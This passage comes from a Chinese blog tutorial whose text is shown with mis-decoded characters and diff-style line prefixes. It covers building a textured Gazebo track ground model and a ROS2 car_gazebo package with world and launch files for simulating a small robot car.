-<img src="https://gitee.com/zyly2033/blog-pic/raw/master/202604052309045.png" style="zoom: 50%">
-<p>åæ¶å·¦ä¾§ç<code>TF</code>å¾éï¼å¯ä»¥æ´å æ¸æ°ççå°å°è½¦æ¨¡åï¼</p>
-<img src="https://gitee.com/zyly2033/blog-pic/raw/master/202604052310477.png" style="zoom: 50%">
-<h3 id="ä¸gazeboä»¿çç¯å¢">ä¸ã<code>Gazebo</code>ä»¿çç¯å¢</h3>
-<h4 id="31-èµéå¶ä½">3.1 èµéå¶ä½</h4>
-<p>è¦å®ç°âå°é¢æ¾ç¤ºèµéå¾âï¼é¦åéè¦åå»ºä¸ä¸ªç¬ç«çå°é¢æ¨¡åï¼æå¾çä½ä¸ºçº¹çè´´ä¸å»ãä»¥ä¸æ¯å®æ´æ­¥éª¤ï¼</p>
-<h5 id="311-åå»ºæ¨¡åæä»¶å¤¹ç»æ">3.1.1 åå»ºæ¨¡åæä»¶å¤¹ç»æ</h5>
-<p>å¨<code>Gazebo</code>çæ¨¡åç®å½ä¸åå»ºå°é¢æ¨¡åæä»¶å¤¹ï¼æ³¨æï¼è¿æ¯ç¨æ·ç®å½ä¸ç<code>.gazebo</code>ï¼ä¸æ¯ç³»ç»ç®å½ï¼ï¼</p>
-<pre><code class="language-shell">zhengyang@ubuntu:~$ cd ~/.gazebo/models
-zhengyang@ubuntu:~/.gazebo/models$ mkdir -p my_track_ground/materials/{scripts,textures}
-</code></pre>
-<p>æç»ç®å½ç»æï¼</p>
-<pre><code class="language-shell">~/.gazebo/models/
-âââ my_track_ground/
-    âââ model.config
-    âââ model.sdf
-    âââ materials/
-        âââ scripts/
-        â   âââ track.material
-        âââ textures/
-            âââ my_track.jpg  
-</code></pre>
-<h5 id="312-åå¤èµéå¾ç">3.1.2 åå¤èµéå¾ç</h5>
-<p>å°ä½ çèµéå¾çï¼<code>JPEG</code>æ<code>PNG</code>æ ¼å¼ï¼æ¾å°<code>textures/</code>ç®å½ä¸ï¼</p>
-<pre><code class="language-shell">zhengyang@ubuntu:~/.gazebo/models$ cp /home/zhengyang/æ¡é¢/my_track.jpg ~/.gazebo/models/my_track_ground/materials/textures/
-</code></pre>
-<p>å¾çå»ºè®®ï¼</p>
-<ul>
-<li>åè¾¨çæ§å¶å¨<code>1024x1024</code>ä»¥å`ï¼è¿å¤§ä¼å¯¼è´å è½½ç¼æ¢æå¤±è´¥ï¼</li>
-<li>å¾çåå®¹åºè¯¥æ¯ä¿¯è§è§è§çèµéå¸å±å¾ï¼ä»æ­£ä¸æ¹çä¸å»çè§å¾ï¼ã</li>
-</ul>
-<h5 id="313-åå»ºæè´¨èæ¬æä»¶">3.1.3 åå»ºæè´¨èæ¬æä»¶</h5>
-<p>åå»º <code>materials/scripts/track.material</code> æä»¶ï¼</p>
-<pre><code class="language-shell">zhengyang@ubuntu:~/.gazebo/models$ vim ~/.gazebo/models/my_track_ground/materials/scripts/track.material
-</code></pre>
-<p>åå¥ä»¥ä¸åå®¹ï¼</p>
-<pre><code class="language-glsl">material Track/Ground
-{
-  technique
-  {
-    pass
-    {
-      ambient 1.0 1.0 1.0 1.0
-      diffuse 0.8 0.8 0.8 1.0
-      specular 0.0 0.0 0.0 1.0 2.0
-
-      texture_unit
-      {
-        texture my_track.jpg
-        filtering trilinear
-      }
-    }
-  }
-}
-</code></pre>
-<p>è¿æ¯ä¸ä¸ª<code>OGRE</code>æè´¨èæ¬ï¼<code>Gazebo</code>åºå±ä½¿ç¨<code>OGRE</code>æ¸²æå¼æï¼éè¿è¿ä¸ªæä»¶åè¯ç³»ç»âå¦ä½æ¾ç¤ºèµéå¾çâã</p>
-<p><code>material Track/Ground</code>ï¼<code>Track/Ground</code>æ¯è¿ä¸ªæè´¨çå¯ä¸æ è¯ç¬¦ãå¨<code>model.sdf</code>ä¸­éè¿ <code>&lt;name&gt;Track/Ground&lt;/name&gt;</code> å¼ç¨å®ãå¯ä»¥çè§£ä¸ºç»è¿ä¸ªâç®è¤âèµ·äºä¸ªåå­ã</p>
-<p>å³é®ç¹ï¼<code>texture my_track.jpg</code> è¿ä¸è¡çæä»¶åå¿é¡»åå¾çæä»¶åå®å¨ä¸è´ã</p>
-<h5 id="314-åå»ºæ¨¡åéç½®æä»¶-modelconfig">3.1.4 åå»ºæ¨¡åéç½®æä»¶ <code>model.config</code></h5>
-<pre><code class="language-shell">zhengyang@ubuntu:~/.gazebo/models$ vim ~/.gazebo/models/my_track_ground/model.config
-</code></pre>
-<p>åå¥ï¼</p>
-<pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
-&lt;model&gt;
-  &lt;name&gt;My Track Ground&lt;/name&gt;
-  &lt;version&gt;1.0&lt;/version&gt;
-  &lt;sdf version="1.6"&gt;model.sdf&lt;/sdf&gt;
-  &lt;description&gt;
-    A ground plane with my custom track image
-  &lt;/description&gt;
-&lt;/model&gt;
-</code></pre>
-<p>è¿ä¸ªæä»¶æ¯<code>Gazebo</code>æ¨¡åçèº«ä»½è¯ï¼åè¯ç³»ç»âè¿æ¯ä»ä¹æ¨¡åãçæ¬å¤å°ãå»åªéæ¾æ¨¡åæè¿°æä»¶âã</p>
-<h5 id="315-åå»ºæ¨¡åæè¿°æä»¶-modelsdf">3.1.5 åå»ºæ¨¡åæè¿°æä»¶ <code>model.sdf</code></h5>
-<pre><code class="language-shell">zhengyang@ubuntu:~/.gazebo/models$ vim ~/.gazebo/models/my_track_ground/model.sdf
-</code></pre>
-<p>åå¥ï¼</p>
-<pre><code class="language-xml">&lt;?xml version="1.0" ?&gt;
-&lt;sdf version="1.6"&gt;
-  &lt;model name="my_track_ground"&gt;
-    &lt;static&gt;true&lt;/static&gt;
-    &lt;link name="link"&gt;
-      &lt;!-- ç¢°æå±æ§ --&gt;
-      &lt;collision name="collision"&gt;
-        &lt;geometry&gt;
-          &lt;plane&gt;
-            &lt;normal&gt;0 0 1&lt;/normal&gt;
-            &lt;size&gt;5.5 5.5&lt;/size&gt;
-          &lt;/plane&gt;
-        &lt;/geometry&gt;
-        &lt;surface&gt;
-          &lt;friction&gt;
-            &lt;ode&gt;
-              &lt;mu&gt;100&lt;/mu&gt;
-              &lt;mu2&gt;50&lt;/mu2&gt;
-            &lt;/ode&gt;
-          &lt;/friction&gt;
-        &lt;/surface&gt;
-      &lt;/collision&gt;
-      
-      &lt;!-- è§è§å±æ§ï¼æ¾ç¤ºå¾ççå°æ¹ï¼ --&gt;
-      &lt;visual name="visual"&gt;
-        &lt;cast_shadows&gt;false&lt;/cast_shadows&gt;
-        &lt;geometry&gt;
-          &lt;plane&gt;
-            &lt;normal&gt;0 0 1&lt;/normal&gt;
-            &lt;size&gt;5.5 5.5&lt;/size&gt;
-          &lt;/plane&gt;
-        &lt;/geometry&gt;
-        &lt;material&gt;
-          &lt;script&gt;
-            &lt;uri&gt;model://my_track_ground/materials/scripts&lt;/uri&gt;
-            &lt;uri&gt;model://my_track_ground/materials/textures&lt;/uri&gt;
-            &lt;name&gt;Track/Ground&lt;/name&gt;
-          &lt;/script&gt;
-        &lt;/material&gt;
-      &lt;/visual&gt;
-    &lt;/link&gt;
-  &lt;/model&gt;
-&lt;/sdf&gt;
-</code></pre>
-<p>è¿æ¯æ¨¡åçæ ¸å¿ç»ææä»¶ï¼å®ä¹äºå°é¢æ¨¡åçç©çå±æ§ï¼ç¢°æãæ©æ¦åï¼åè§è§å±æ§ï¼å¾ççº¹çï¼ã</p>
-<p>å³é®ç¹ï¼</p>
-<ul>
-<li><code>&lt;size&gt;5.5 5.5&lt;/size&gt;</code> ä¸­çæ°å­æ¯å°é¢çå¤§å°ï¼åä½ï¼ç±³ï¼ï¼æ ¹æ®èµéå®éå°ºå¯¸è°æ´;</li>
-<li><code>&lt;uri&gt;</code> ä¸­çè·¯å¾ä½¿ç¨ <code>model://</code> åè®®ï¼æåæ¨¡åæä»¶å¤¹;</li>
-<li><code>&lt;name&gt;Track/Ground&lt;/name&gt;</code> å¿é¡»ä¸ <code>.material</code> æä»¶ä¸­çæè´¨åå®å¨ä¸è´ã</li>
-</ul>
-<h5 id="316-æµè¯æ¨¡å">3.1.6 æµè¯æ¨¡å</h5>
-<p>â  éå¯<code>Gazebo</code>ï¼ç¡®ä¿å·æ°æ¨¡åç¼å­ï¼ï¼</p>
-<p>â¡ å¨å·¦ä¾§<code>Insert</code>æ ç­¾é¡µä¸­ï¼æ¾å°<code>My Track Ground</code>ï¼</p>
-<p>â¢ ç¹å»å®ï¼ç¶åå¨<code>3D</code>åºæ¯ä¸­åå»æ¾ç½®ï¼</p>
-<img src="https://gitee.com/zyly2033/blog-pic/raw/master/20260406214740855.png" style="zoom: 33%">
-<h4 id="32-car_gazeboåè½å">3.2 <code>car_gazebo</code>åè½å</h4>
-<p><code>car_gazebo</code> æ¯æ´ä¸ªä»¿çé¡¹ç®çâå¯å¨ä¸åºæ¯ä¸­å¿âï¼å®è´è´£æåå»ºçææç»ä»¶ï¼å°è½¦æ¨¡åãèµéæ¨¡åãç©çç¯å¢ï¼ç»è£æä¸ä¸ªå¯è¿è¡çä»¿çç³»ç»ãå¶æ ¸å¿åè½ï¼</p>
-<table>
-<thead>
-<tr>
-<th style="text-align: left">åè½</th>
-<th style="text-align: left">è¯´æ</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align: left"><strong>å­æ¾ä¸çæä»¶</strong></td>
-<td style="text-align: left">æä¾ <code>.world</code> æä»¶ï¼å®ä¹èµéãåç§ãç©çåæ°</td>
-</tr>
-<tr>
-<td style="text-align: left"><strong>å­æ¾èµéæ¨¡å</strong></td>
-<td style="text-align: left">ç®¡çèªå®ä¹æ¨¡åï¼ <code>my_track_ground</code>ï¼</td>
-</tr>
-<tr>
-<td style="text-align: left"><strong>å¯å¨ Gazebo</strong></td>
-<td style="text-align: left">ä¸é®å¯å¨ä»¿çæå¡å¨ï¼<code>gzserver</code>ï¼å <code>GUI</code>ï¼<code>gzclient</code>ï¼</td>
-</tr>
-<tr>
-<td style="text-align: left"><strong>çæå°è½¦</strong></td>
-<td style="text-align: left">å° <code>car_description</code> ä¸­çå°è½¦æ¨¡åæ¾å¥ä»¿çä¸ç</td>
-</tr>
-</tbody>
-</table>
-<p>æ¥ä¸æ¥æä»¬åå»º<code>car_gazebo </code>ç<code>Python</code>çæ¬çåè½åï¼</p>
-<pre><code class="language-shell">zhengyang@ubuntu:/opt/2k0300/loongson_2k300_lib/car_ws/src$ ros2 pkg create --build-type ament_python car_gazebo
-</code></pre>
-<p>è¿è¡æååï¼ç»ç«¯ä¼æ¾ç¤ºåå»ºçæä»¶åç®å½ä¿¡æ¯ãæ­¤æ¶ï¼ <code>car_gazebo</code> åè½åç®å½ç»æå°å¦ä¸æç¤ºï¼</p>
-<pre><code class="language-shell">zhengyang@ubuntu:/opt/2k0300/loongson_2k300_lib/car_ws/src$ tree ./car_gazebo/
-./car_gazebo/
-âââ car_gazebo      # æ ¸å¿Pythonæ¨¡åç®å½ï¼ç¨äºå­æ¾Pythonä»£ç 
-â&nbsp;&nbsp; âââ __init__.py
-âââ package.xml      # åè½åçæè¿°æä»¶ï¼å«ä¾èµä¿¡æ¯ï¼
-âââ resource         # èµæºæä»¶å¤¹
-â&nbsp;&nbsp; âââ car_gazebo
-âââ setup.cfg        # setuptools çéç½®æä»¶ 
-âââ setup.py         # Python åçå®è£èæ¬
-âââ test             # æµè¯æä»¶å¤¹
-</code></pre>
-<h5 id="321-å­ç®å½">3.2.1 å­ç®å½</h5>
-<p><code>car_gazebo</code>åè½ååå»ºå¥½äºï¼æä»¬éè¦åå»ºå¦ä¸å­ç®å½ï¼</p>
-<ul>
-<li><code>worlds</code>ï¼å­æ¾<code>.world</code>ä¸çåºæ¯æä»¶ï¼æè¿°èµéãåç§ãç©çåæ°ç­ï¼</li>
-<li><code>launch</code>ï¼å­æ¾å¯å¨èæ¬ï¼ä¸é®å¯å¨å®æ´ä»¿çç¯å¢ï¼</li>
-<li><code>models</code>ï¼å­æ¾èªå®ä¹æ¨¡åï¼</li>
-<li><code>config</code>ï¼å­æ¾<code>Gazebo</code>æ§å¶å¨çéç½®æä»¶ã</li>
-</ul>
-<p>å¨ç»ç«¯ä¸­æ§è¡ï¼</p>
-<pre><code class="language-shell">zhengyang@ubuntu:/opt/2k0300/loongson_2k300_lib/car_ws/src$ cd car_gazebo/
-zhengyang@ubuntu:/opt/2k0300/loongson_2k300_lib/car_ws/src/car_gazebo$ mkdir worlds config launch models
-</code></pre>
-<p>æä»¬éè¦ä¿®æ¹<code>setup.py</code>æä»¶ï¼åè¯<code>Python</code>å®è£åªäºèµæºæä»¶ï¼</p>
-<pre><code class="language-python">import os
-from glob import glob
-
-    ...
-
-    data_files=[
-        ('share/ament_index/resource_index/packages',
-            ['resource/' + package_name]),
-        ('share/' + package_name, ['package.xml']),
-        (os.path.join('share', package_name, 'launch'), glob(os.path.join('launch', '*.launch.py'))),
-        (os.path.join('share', package_name, 'worlds'), glob(os.path.join('worlds', '*.*'))),
-        (os.path.join('share', package_name, 'config'), glob(os.path.join('config', '*.*'))),
-        (os.path.join('share', package_name, 'models'), glob(os.path.join('models', '*.*'))),
-    ],
-
-    ...
-</code></pre>
-<h5 id="322-æ¾ç½®èµéæ¨¡å">3.2.2 æ¾ç½®èµéæ¨¡å</h5>
-<p>å¤å¶èµéæ¨¡åï¼</p>
-<pre><code class="language-shell">zhengyang@ubuntu:/opt/2k0300/loongson_2k300_lib/car_ws/src/car_gazebo$ cp -r ~/.gazebo/models/my_track_ground ./models/
-</code></pre>
-<h5 id="323-åå»ºä¸çæä»¶">3.2.3 åå»ºä¸çæä»¶</h5>
-<p>å¨<code>worlds/</code>ç®å½ä¸åå»º<code>track.world</code>æä»¶ï¼</p>
-<pre><code class="language-shell">zhengyang@ubuntu:/opt/2k0300/loongson_2k300_lib/car_ws/src/car_gazebo$ cd worlds
-zhengyang@ubuntu:/opt/2k0300/loongson_2k300_lib/car_ws/src/car_gazebo/worlds$ vim track.world
-</code></pre>
-<p>å¡«å¥ä»¥ä¸åå®¹ï¼</p>
-<pre><code class="language-shell">&lt;?xml version="1.0" ?&gt;
-&lt;sdf version="1.6"&gt;
-  &lt;world name="car_world"&gt;
-    &lt;!-- ç¯å¢åç§ --&gt;
-    &lt;include&gt;
-      &lt;uri&gt;model://sun&lt;/uri&gt;
-    &lt;/include&gt;
-
-    &lt;!-- å°é¢ï¼å¦æéè¦é»è®¤å°é¢ï¼ --&gt;
-    &lt;include&gt;
-      &lt;uri&gt;model://ground_plane&lt;/uri&gt;
-    &lt;/include&gt;
-
-    &lt;!-- èµéæ¨¡å --&gt;
-    &lt;include&gt;
-      &lt;uri&gt;model://my_track_ground&lt;/uri&gt;
-      &lt;pose&gt;0 0 0 0 0 0&lt;/pose&gt;
-    &lt;/include&gt;
-
-    &lt;!-- ç©çå¼æéç½® --&gt;
-    &lt;physics type="ode"&gt;
-      &lt;real_time_update_rate&gt;1000.0&lt;/real_time_update_rate&gt;
-      &lt;max_step_size&gt;0.001&lt;/max_step_size&gt;
-    &lt;/physics&gt;
-  &lt;/world&gt;
-&lt;/sdf&gt;
-</code></pre>
-<p>ä¸çæä»¶æ¯æåå»ºçèµéæ¨¡åãåç§ãç©çè§åç»è£æä¸ä¸ªå®æ´çä»¿çåºæ¯ï¼è®©å°è½¦è½å¨éé¢è·èµ·æ¥ã</p>
-<h5 id="324-launchæä»¶">3.2.4 <code>launch</code>æä»¶</h5>
-<p>å¨<code>launch/</code>ç®å½ä¸åå»º<code>gazebo.launch.py</code>ï¼</p>
-<pre><code class="language-python">import os
-from ament_index_python.packages import get_package_share_directory
-from launch import LaunchDescription
-from launch.actions import IncludeLaunchDescription, SetEnvironmentVariable
-from launch.launch_description_sources import PythonLaunchDescriptionSource
-from launch_ros.actions import Node
-from launch.substitutions import Command
-
-def generate_launch_description():
-    # è·ååè½åè·¯å¾
-    pkg_car_gazebo = get_package_share_directory('car_gazebo')
-    pkg_car_description = get_package_share_directory('car_description')
-
-    # ========== å³é®ï¼1. è®¾ç½® Gazebo æ¨¡åè·¯å¾ ==========
-    # å°åè½ååç models ç®å½æ·»å å°æ¨¡åæç´¢è·¯å¾
-    gazebo_models_path = os.path.join(pkg_car_gazebo, 'models')
-    
-    # è·ååæç GAZEBO_MODEL_PATHï¼å¦æå­å¨ï¼
-    original_model_path = os.environ.get('GAZEBO_MODEL_PATH', '')
-    
-    # æ¼æ¥è·¯å¾ï¼æ°è·¯å¾ + åéç¬¦ + åè·¯å¾
-    if original_model_path:
-        model_path = gazebo_models_path + ':' + original_model_path
-    else:
-        model_path = gazebo_models_path
-    
-    set_model_path = SetEnvironmentVariable(
-        name='GAZEBO_MODEL_PATH',
-        value=model_path
-    )
-    # ================================================
-
-    # 2. å¯å¨ Gazebo æå¡ç«¯ï¼å è½½ä¸çï¼
-    gazebo_server = IncludeLaunchDescription(
-        PythonLaunchDescriptionSource(
-            os.path.join(get_package_share_directory('gazebo_ros'), 'launch', 'gzserver.launch.py')
-        ),
-        # æå®è¦å è½½çä¸çæä»¶è·¯å¾
-        launch_arguments={'world': os.path.join(pkg_car_gazebo, 'worlds', 'track.world')}.items()
-    )
-
-    # 3. å¯å¨ Gazebo å®¢æ·ç«¯ï¼GUIçé¢ï¼
-    gazebo_client = IncludeLaunchDescription(
-        PythonLaunchDescriptionSource(
-            os.path.join(get_package_share_directory('gazebo_ros'), 'launch', 'gzclient.launch.py')
-        )
-    )
-
-    # 4. æºå¨äººç¶æåå¸å¨ï¼å¯å¨robot_state_publisherèç¹
-    robot_state_publisher = Node(
-        package='robot_state_publisher',
-        executable='robot_state_publisher',
-        # åæ°
-        parameters=[{
-            # éè¿ xacro å½ä»¤è§£æ car.xacro æä»¶ï¼å¾å° URDF æ¨¡åæè¿°
-            'robot_description': Command(['xacro ', os.path.join(pkg_car_description, 'urdf', 'car.xacro')]),
-            # è®¾ç½®ä¸º Trueï¼åè¯ ROS ä½¿ç¨ä»¿çæ¶é´ï¼/clock è¯é¢ï¼èä¸æ¯ç³»ç»æ¶é´
-            'use_sim_time': True
-        }]
-    )
-
-    # 5. çæå°è½¦ï¼è°ç¨Gazeboçæå¡ï¼å°å°è½¦æ¨¡åçæå°ä»¿çä¸çä¸­
-    spawn_entity = Node(
-        package='gazebo_ros',
-        executable='spawn_entity.py',
-        # ä» /robot_description è¯é¢è¯»åæ¨¡åæ°æ®ï¼ç»çæçå°è½¦å½åä¸º f_car_model
-        arguments=['-topic', 'robot_description', '-entity', 'f_car_model', 
-                   # å°è½¦å¨ Gazebo ä¸çä¸­çåå§ä½ç½®ï¼x=0, y=0, z=0.05ç±³ï¼
-                   '-x', '0.0', '-y', '0.0', '-z', '0.05'],
-        # å°èç¹çè¾åºæå°å°ç»ç«¯
-        output='screen'
-    )
-
-    return LaunchDescription([
-        set_model_path,        # 1. åè®¾ç½®ç¯å¢åé
-        gazebo_server,         # 2. å¯å¨ Gazebo æå¡ç«¯
-        gazebo_client,         # 3. å¯å¨ Gazebo å®¢æ·ç«¯
-        robot_state_publisher, # 4. åå¸æºå¨äººæ¨¡å
-        spawn_entity,          # 5. å¨ Gazebo ä¸­çæå°è½¦
-    ])
-</code></pre>
-<p>æ´ä½æµç¨å¦ä¸ï¼</p>
-<pre><code class="language-shell">âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-â                    ros2 launch æ§è¡                         â
-âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-                              â
-                              â¼
-âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-â  1. è®¾ç½® GAZEBO_MODEL_PATH                                   â
-â     è®© Gazebo è½æ¾å°åè½ååç models/ ç®å½                    â
-âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-                              â
-                              â¼
-âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-â  2. å¯å¨ gzserverï¼æå¡ç«¯ï¼                                   â
-â     - å è½½ track.worldï¼èµéãåç§ãç©çåæ°ï¼                  â
-â     - è¿è¡ç©çå¼æ                                           â
-â     - å¤çä¼ æå¨æ°æ®                                         â
-âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-                              â
-                              â¼
-âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-â  3. å¯å¨ gzclientï¼å®¢æ·ç«¯ï¼                                   â
-â     - æ¾ç¤º 3D å¾å½¢çé¢                                       â
-â     - åè®¸ç¨æ·äº¤äº                                           â
-âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-                              â
-                              â¼
-âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-â  4. å¯å¨ robot_state_publisher                               â
-â     - è§£æ car.xacro â URDF                                  â
-â     - åå¸å° /robot_description è¯é¢                         â
-â     - åå¸ TF åæ åæ¢                                       â
-âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-                              â
-                              â¼
-âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-â  5. çæå°è½¦ï¼spawn_entity.pyï¼                              â
-â     - ä» /robot_description è¯»åæ¨¡å                         â
-â     - è°ç¨ Gazebo æå¡çæå®ä½                               â
-â     - å°è½¦åºç°å¨èµéä¸                                       â
-âââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââââ
-</code></pre>
-<h5 id="325-packagexml">3.2.5 <code>package.xml</code></h5>
-<p>ä¿®æ¹<code>package.xml</code>æ·»å ä»¥ä¸ä¾èµï¼</p>
-<pre><code class="language-xml">&lt;depend&gt;gazebo_ros&lt;/depend&gt;
-&lt;depend&gt;robot_state_publisher&lt;/depend&gt;
-&lt;depend&gt;car_description&lt;/depend&gt;
-&lt;depend&gt;geometry_msgs&lt;/depend&gt;
-&lt;depend&gt;sensor_msgs&lt;/depend&gt;
-
-&lt;exec_depend&gt;ros2launch&lt;/exec_depend&gt;
-&lt;exec_depend&gt;xacro&lt;/exec_depend&gt;
-</code></pre>
-<p><code>&lt;depend&gt;</code> ï¼è¿ç§ä¾èµå¨ç¼è¯æ¶åè¿è¡æ¶é½éè¦ï¼</p>
-<table>
-<thead>
-<tr>
-<th style="text-align: left">ä¾èµ</th>
-<th style="text-align: left">ä½ç¨</th>
-<th style="text-align: left">ä¸ºä»ä¹éè¦</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align: left"><strong><code>gazebo_ros</code></strong></td>
-<td style="text-align: left">Gazebo ä¸ ROS2 çæ¡¥æ¥å</td>
-<td style="text-align: left">æä¾ <code>gzserver.launch.py</code>ã<code>gzclient.launch.py</code>ã<code>spawn_entity.py</code> ç­å¯å¨æä»¶åå·¥å·</td>
-</tr>
-<tr>
-<td style="text-align: left"><strong><code>robot_state_publisher</code></strong></td>
-<td style="text-align: left">æºå¨äººç¶æåå¸å¨</td>
-<td style="text-align: left">å° URDF æ¨¡ååå¸å° <code>/robot_description</code> è¯é¢ï¼å¹¶è®¡ç® TF åæ åæ¢</td>
-</tr>
-<tr>
-<td style="text-align: left"><strong><code>car_description</code></strong></td>
-<td style="text-align: left">ä½ çå°è½¦æè¿°å</td>
-<td style="text-align: left"><code>car_gazebo</code> éè¦å¼ç¨ <code>car_description</code> ä¸­ç URDF æä»¶æ¥çæå°è½¦</td>
-</tr>
-<tr>
-<td style="text-align: left"><strong><code>geometry_msgs</code></strong></td>
-<td style="text-align: left">å ä½æ¶æ¯å®ä¹</td>
-<td style="text-align: left">æä¾ <code>Twist</code>ï¼éåº¦æä»¤ï¼ã<code>Pose</code>ï¼ä½ç½®ï¼ç­æ¶æ¯ç±»å</td>
-</tr>
-<tr>
-<td style="text-align: left"><strong><code>sensor_msgs</code></strong></td>
-<td style="text-align: left">ä¼ æå¨æ¶æ¯å®ä¹</td>
-<td style="text-align: left">æä¾ <code>Image</code>ï¼å¾åï¼ã<code>LaserScan</code>ï¼æ¿åé·è¾¾ï¼ç­æ¶æ¯ç±»å</td>
-</tr>
-</tbody>
-</table>
-<p><code>&lt;exec_depend&gt;</code> ï¼è¿ç§ä¾èµåªå¨è¿è¡æ¶éè¦ï¼ç¼è¯æ¶ä¸éè¦ï¼</p>
-<table>
-<thead>
-<tr>
-<th style="text-align: left">ä¾èµ</th>
-<th style="text-align: left">ä½ç¨</th>
-<th style="text-align: left">ä¸ºä»ä¹éè¦</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align: left"><strong><code>ros2launch</code></strong></td>
-<td style="text-align: left">ROS2 å¯å¨ç³»ç»</td>
-<td style="text-align: left">æä¾ <code>ros2 launch</code> å½ä»¤æ¥æ§è¡ä½ ç <code>.launch.py</code> æä»¶</td>
-</tr>
-<tr>
-<td style="text-align: left"><strong><code>xacro</code></strong></td>
-<td style="text-align: left">Xacro å®å¤çå¨</td>
-<td style="text-align: left">å° <code>car.xacro</code> æä»¶è§£æææ å URDF æ ¼å¼</td>
-</tr>
-</tbody>
-</table>
-<h4 id="33-ç¼è¯è¿è¡">3.3 ç¼è¯è¿è¡</h4>
-<h5 id="331-ç¼è¯">3.3.1 ç¼è¯</h5>
-<p>å¨ <code>car_ws</code> ç®å½ä¸ç¼è¯å¹¶æ£æ¥ï¼</p>
-<pre><code class="language-shell">zhengyang@ubuntu:~$ cd /opt/2k0300/loongson_2k300_lib/car_ws
-
-zhengyang@ubuntu:/opt/2k0300/loongson_2k300_lib/car_ws$ colcon build --paths src/car_gazebo
-.....
-Finished &lt;&lt;&lt; car_description [0.92s]
-
-zhengyang@ubuntu:/opt/2k0300/loongson_2k300_lib/car_ws$ source install/setup.sh
-</code></pre>
-<h5 id="332-è¿è¡">3.3.2 è¿è¡</h5>
-<p>å¯å¨ç»ç«¯ï¼è¿è¡å¦ä¸å½ä»¤ï¼</p>
-<pre><code class="language-shell">zhengyang@ubuntu:/opt/2k0300/loongson_2k300_lib/car_ws$ source /usr/share/gazebo/setup.sh
-zhengyang@ubuntu:/opt/2k0300/loongson_2k300_lib/car_ws$ ros2 launch car_gazebo gazebo.launch.py
-</code></pre>
-<p>å¶ä¸­ç¬¬ä¸æ¡å½ä»¤æ¯<code>Gazebo</code>çç¯å¢åå§åèæ¬ï¼å®è®¾ç½®äº<code>Gazebo</code>è¿è¡æéçææå³é®ç¯å¢åéãæ§è¡å®ä¹åï¼<code>Gazebo</code>æç¥éå»åªéæ¾æ¨¡åãçº¹çãæä»¶ç­èµæºã</p>
-<p>å¯å¨åï¼å¨ç»ç«¯ä¸­è§å¯è¾åºï¼åºè¯¥è½çå°ç±»ä¼¼ï¼</p>
-<pre><code class="language-shell">[INFO] [launch]: All log files can be found below /home/zhengyang/.ros/log/2026-04-06-22-46-04-945865-ubuntu-7770
-[INFO] [launch]: Default logging verbosity is set to INFO
-[INFO] [gzserver-1]: process started with pid [7772]
-[INFO] [gzclient-2]: process started with pid [7774]
-[INFO] [robot_state_publisher-3]: process started with pid [7776]
-[INFO] [spawn_entity.py-4]: process started with pid [7778]
-[robot_state_publisher-3] [WARN] [1775486766.270936218] [kdl_parser]: The root link base_link has an inertia specified in the URDF, but KDL does not support a root link with an inertia.  As a workaround, you can add an extra dummy link to your URDF.
-[robot_state_publisher-3] [INFO] [1775486766.271055446] [robot_state_publisher]: got segment base_link
-[robot_state_publisher-3] [INFO] [1775486766.271113330] [robot_state_publisher]: got segment camera_link
-[robot_state_publisher-3] [INFO] [1775486766.271122952] [robot_state_publisher]: got segment caster_mount
-[robot_state_publisher-3] [INFO] [1775486766.271130386] [robot_state_publisher]: got segment caster_small_wheel
-[robot_state_publisher-3] [INFO] [1775486766.271137270] [robot_state_publisher]: got segment left_wheel
-[robot_state_publisher-3] [INFO] [1775486766.271144440] [robot_state_publisher]: got segment right_wheel
-[spawn_entity.py-4] [INFO] [1775486766.463558272] [spawn_entity]: Spawn Entity started
-[spawn_entity.py-4] [INFO] [1775486766.464229838] [spawn_entity]: Loading entity published on topic robot_description
-[spawn_entity.py-4] [INFO] [1775486766.466313740] [spawn_entity]: Waiting for entity xml on robot_description
-[spawn_entity.py-4] [INFO] [1775486766.478841252] [spawn_entity]: Waiting for service /spawn_entity, timeout = 30
-[spawn_entity.py-4] [INFO] [1775486766.479458411] [spawn_entity]: Waiting for service /spawn_entity
-[spawn_entity.py-4] [INFO] [1775486767.541013852] [spawn_entity]: Calling service /spawn_entity
-[spawn_entity.py-4] [INFO] [1775486767.862541616] [spawn_entity]: Spawn status: SpawnEntity: Successfully spawned entity [f_car_model]
-[INFO] [spawn_entity.py-4]: process has finished cleanly [pid 7778]
-[gzserver-1] [INFO] [1775486768.417964902] [camera_controller]: Publishing camera info to [/camera1/camera_info]
-[gzserver-1] [INFO] [1775486768.499211805] [differential_drive_controller]: Wheel pair 1 separation set to [0.155000m]
-[gzserver-1] [INFO] [1775486768.500293362] [differential_drive_controller]: Wheel pair 1 diameter set to [0.064000m]
-[gzserver-1] [INFO] [1775486768.502493894] [differential_drive_controller]: Subscribed to [/cmd_vel]
-</code></pre>
-<p>åæ¶å¨<code>Gazebo GUI</code>ä¸­åºè¯¥è½çå°ï¼</p>
-<ul>
-<li>èµéå°é¢ï¼å¸¦æèµéå¾ççº¹çï¼ï¼</li>
-<li>å°è½¦æ¨¡ååºç°å¨èµéä¸ã</li>
-</ul>
-<img src="https://gitee.com/zyly2033/blog-pic/raw/master/20260406224822875.png" style="zoom: 33%">
-<h5 id="333-æµè¯å°è½¦æ§å¶">3.3.3 æµè¯å°è½¦æ§å¶</h5>
-<p>æå¼ç¬¬äºä¸ªç»ç«¯ï¼å¯å¨é®çæ§å¶èç¹ï¼</p>
-<pre><code class="language-shell">zhengyang@ubuntu:~/dev_ws$ ros2 run teleop_twist_keyboard teleop_twist_keyboard
-
-This node takes keypresses from the keyboard and publishes them
